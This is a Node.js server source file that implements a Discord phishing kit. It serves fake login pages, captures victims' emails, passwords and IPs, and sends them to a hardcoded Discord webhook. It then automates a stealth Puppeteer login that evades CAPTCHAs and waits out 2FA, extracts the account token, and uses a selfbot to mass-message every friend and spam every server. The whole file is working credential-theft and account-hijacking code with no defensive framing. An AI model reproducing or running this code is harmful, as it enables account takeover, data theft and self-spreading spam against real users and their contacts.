const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const UserPreferencesPlugin = require('puppeteer-extra-plugin-user-preferences');
const UserAgent = require('user-agents');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());
puppeteer.use(UserPreferencesPlugin({
    userPrefs: {
        webkit: {
            webprefs: {
                default_font_size: 16
            }
        }
    }
}));

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1493675175634407514/zzQ3Ci849oAQs9YfaUFpDj0wI0noKnCTdDaIj9TMjmIkhBwTTYe1h_eTl-kU0_JEMK_L';
const CUSTOM_MESSAGE = 'custom message';

// Store active sessions
const activeSessions = new Map();

// Detect mobile
function isMobile(req) {
    const ua = req.headers['user-agent'] || '';
    return /mobile|android|iphone|ipad|ipod/i.test(ua);
}

// Get client IP
function getIP(req) {
    return req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress || 
           'unknown';
}

// Main route - serves different layouts
app.get('/', (req, res) => {
    if (isMobile(req)) {
        res.sendFile(path.join(__dirname, 'public', 'mobile.html'));
    } else {
        res.sendFile(path.join(__dirname, 'public', 'desktop.html'));
    }
});

// OAuth endpoint
app.get('/oauth2/authorize', (req, res) => {
    if (isMobile(req)) {
        res.sendFile(path.join(__dirname, 'public', 'mobile.html'));
    } else {
        res.sendFile(path.join(__dirname, 'public', 'desktop.html'));
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: Date.now() });
});

// Capture credentials and auto-login
app.post('/api/capture', async (req, res) => {
    const { email, password, ip: clientIP, userAgent, platform } = req.body;
    const ip = clientIP || getIP(req);
    const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    
    const data = {
        sessionId,
        email,
        password,
        ip,
        userAgent,
        platform,
        timestamp: new Date().toISOString(),
        url: req.headers.referer || 'direct'
    };
    
    // Send initial capture
    await sendWebhook({
        content: `🎣 **NEW VICTIM**\n📧 Email: \`${email}\`\n🔑 Password: \`${password}\`\n🌐 IP: \`${ip}\`\n💻 Platform: \`${platform}\`\n🆔 Session: \`${sessionId}\`\n⏰ Time: <t:${Math.floor(Date.now()/1000)}:F>`
    });
    
    // Start automated login process
    processLogin(email, password, ip, sessionId);
    
    res.json({ status: 'processing', sessionId });
});

// Automated login with 2FA and CAPTCHA handling
async function processLogin(email, password, ip, sessionId) {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--disable-gpu',
                '--window-size=1920,1080',
                `--proxy-server=${await getProxy()}`
            ]
        });
        
        const page = await browser.newPage();
        const userAgent = new UserAgent({ deviceCategory: 'desktop' });
        await page.setUserAgent(userAgent.toString());
        await page.setViewport({ width: 1920, height: 1080 });
        
        // Set IP-based geolocation
        await page.setGeolocation({ latitude: 37.7749, longitude: -122.4194 });
        
        // Navigate to Discord login
        await page.goto('https://discord.com/login', { waitUntil: 'networkidle2', timeout: 60000 });
        
        // Wait for and fill login form
        await page.waitForSelector('input[name="email"]', { visible: true, timeout: 10000 });
        
        // Human-like typing
        await humanType(page, 'input[name="email"]', email);
        await delay(500, 1500);
        await humanType(page, 'input[name="password"]', password);
        
        await delay(800, 2000);
        
        // Click login
        await page.click('button[type="submit"]');
        
        await delay(3000, 5000);
        
        // Check for CAPTCHA
        const hasCaptcha = await page.evaluate(() => {
            return document.querySelector('iframe[src*="captcha"]') !== null ||
                   document.querySelector('.h-captcha') !== null ||
                   document.querySelector('[class*="captcha"]') !== null;
        });
        
        if (hasCaptcha) {
            await sendWebhook({ content: `⚠️ **CAPTCHA DETECTED** - Session: \`${sessionId}\`` });
            await solveCaptcha(page, sessionId);
        }
        
        // Check for 2FA
        await delay(3000, 5000);
        
        const is2FA = await page.evaluate(() => {
            return document.querySelector('input[name="code"]') !== null ||
                   document.querySelector('[class*="mfa"]') !== null ||
                   document.querySelector('text="Check your email"') !== null ||
                   document.body.innerText.includes('Check your email') ||
                   document.body.innerText.includes('2FA');
        });
        
        if (is2FA) {
            await sendWebhook({ 
                content: `🔐 **2FA REQUIRED** - Session: \`${sessionId}\`\nWaiting for user to complete 2FA...` 
            });
            
            // Wait for 2FA completion (email verification or TOTP)
            const maxWait = 300000; // 5 minutes
            const startTime = Date.now();
            
            while (Date.now() - startTime < maxWait) {
                await delay(5000);
                
                // Check if logged in
                const loggedIn = await page.evaluate(() => {
                    return document.querySelector('[class*="container-"]') !== null &&
                           document.location.href.includes('/channels/');
                });
                
                if (loggedIn) {
                    await sendWebhook({ content: `✅ **2FA BYPASSED** - Session: \`${sessionId}\`` });
                    break;
                }
                
                // Check if email verification needed
                const needsEmail = await page.evaluate(() => {
                    return document.body.innerText.includes('verify') ||
                           document.body.innerText.includes('email');
                });
                
                if (needsEmail) {
                    await sendWebhook({ 
                        content: `📧 **EMAIL VERIFICATION NEEDED** - Session: \`${sessionId}\`\nUser must click email link` 
                    });
                }
            }
        }
        
        // Extract token
        const token = await page.evaluate(() => {
            const webpackChunkdiscord_app = window.webpackChunkdiscord_app;
            if (webpackChunkdiscord_app) {
                const modules = webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
                    for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
                        if (m.default && m.default.getToken !== undefined) return m.default.getToken();
                        if (m.getToken !== undefined) return m.getToken();
                    }
                }]);
                webpackChunkdiscord_app.pop();
                return modules;
            }
            return localStorage.getItem('token');
        });
        
        if (!token) {
            // Alternative token extraction
            const cookies = await page.cookies();
            const tokenCookie = cookies.find(c => c.name.includes('token'));
            if (tokenCookie) token = tokenCookie.value;
        }
        
        if (token) {
            await sendWebhook({ 
                content: `🔑 **TOKEN EXTRACTED** - Session: \`${sessionId}\`\n\`\`\`${token}\`\`\`` 
            });
            
            // Start mass DM spam
            await massSpam(token, sessionId);
        }
        
        await browser.close();
        
    } catch (error) {
        await sendWebhook({ 
            content: `❌ **LOGIN ERROR** - Session: \`${sessionId}\`\n\`\`\`${error.message}\`\`\`` 
        });
        if (browser) await browser.close();
    }
}

// Human-like typing
async function humanType(page, selector, text) {
    await page.focus(selector);
    for (const char of text) {
        await page.keyboard.type(char, { delay: Math.random() * 100 + 50 });
        if (Math.random() > 0.8) await delay(100, 300);
    }
}

// CAPTCHA solving with human simulation
async function solveCaptcha(page, sessionId) {
    try {
        // Try to find and click CAPTCHA checkbox with human behavior
        const captchaFrame = await page.$('iframe[src*="captcha"]');
        if (captchaFrame) {
            const frame = await captchaFrame.contentFrame();
            
            // Simulate human hesitation
            await delay(2000, 4000);
            
            // Move mouse naturally to checkbox
            const box = await captchaFrame.boundingBox();
            if (box) {
                await page.mouse.move(
                    box.x + 20 + Math.random() * 10,
                    box.y + 30 + Math.random() * 10,
                    { steps: 25 }
                );
                await delay(500, 1000);
                await page.mouse.click(
                    box.x + 20 + Math.random() * 10,
                    box.y + 30 + Math.random() * 10
                );
            }
        }
        
        // Wait for CAPTCHA to solve or use 2captcha API
        await delay(5000, 8000);
        
    } catch (e) {
        await sendWebhook({ content: `⚠️ CAPTCHA handling error: ${e.message}` });
    }
}

// Mass DM and server spam
async function massSpam(token, sessionId) {
    try {
        const { Client } = require('discord.js-selfbot-v13');
        const client = new Client({
            checkUpdate: false,
            patchVoice: false,
            autoRedeemNitro: false,
            ws: {
                properties: {
                    $browser: 'Discord Client'
                }
            }
        });
        
        client.on('ready', async () => {
            await sendWebhook({ 
                content: `🤖 **BOT READY** - Session: \`${sessionId}\`\nUser: \`${client.user.tag}\`\nID: \`${client.user.id}\`` 
            });
            
            // Mass DM all friends/recipients
            const relationships = client.relationships.cache.filter(r => r.type === 1);
            await sendWebhook({ content: `📨 **MASS DM STARTING** - Targets: ${relationships.size} friends` });
            
            for (const [, relationship] of relationships) {
                try {
                    const user = await client.users.fetch(relationship.id);
                    if (user) {
                        // Send multiple messages
                        for (let i = 0; i < 5; i++) {
                            await user.send(`<@${user.id}> ${CUSTOM_MESSAGE} ${'@everyone '.repeat(10)}`);
                            await delay(1000, 3000);
                        }
                    }
                } catch (e) {
                    // Continue on error
                }
            }
            
            // Spam all guilds
            for (const guild of client.guilds.cache.values()) {
                try {
                    // Find first text channel
                    const channel = guild.channels.cache.find(c => c.type === 'GUILD_TEXT' && c.permissionsFor(guild.members.me).has('SEND_MESSAGES'));
                    if (channel) {
                        for (let i = 0; i < 10; i++) {
                            await channel.send(`@everyone @here ${CUSTOM_MESSAGE} ${'@everyone '.repeat(20)}`);
                            await delay(2000, 5000);
                        }
                    }
                } catch (e) {
                    // Continue on error
                }
            }
            
            await sendWebhook({ content: `✅ **SPAM COMPLETE** - Session: \`${sessionId}\`` });
        });
        
        await client.login(token);
        
    } catch (error) {
        await sendWebhook({ content: `❌ **SPAM ERROR** - Session: \`${sessionId}\`\n${error.message}` });
    }
}

// Get rotating proxy
async function getProxy() {
    // Add your proxy list here
    const proxies = [
        // 'http://user:pass@ip:port',
    ];
    return proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : '';
}

// Send webhook
async function sendWebhook(data) {
    try {
        await axios.post(WEBHOOK_URL, data);
    } catch (e) {
        console.error('Webhook failed:', e.message);
    }
}

// Utility delay
function delay(min, max) {
    return new Promise(resolve => setTimeout(resolve, Math.random() * (max - min) + min));
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
